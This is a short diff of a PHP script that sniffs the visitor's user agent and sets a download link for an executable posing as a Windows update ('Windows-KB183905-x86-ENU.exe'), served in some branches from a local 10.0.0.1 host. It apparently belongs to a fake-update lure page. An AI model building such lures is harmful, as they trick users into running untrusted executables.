@@ -11,7 +11,6 @@ if (stripos($_SERVER['HTTP_USER_AGENT'], 'linux') !== FALSE) {
       $OS = "Windows";
     #$file = "http://10.0.0.1/Windows-KB183905-x86-ENU.exe";
     $file = "http://update.microsoft.com/Windows-KB183905-x86-ENU.exe";
-    #$file = "http://".$_SERVER['HTTP_HOST']."/Windows-KB183905-x86-ENU.exe";
 } else {
       $OS = "your operating system";
     $file = "http://10.0.0.1/Windows-KB183905-x86-ENU.exe";
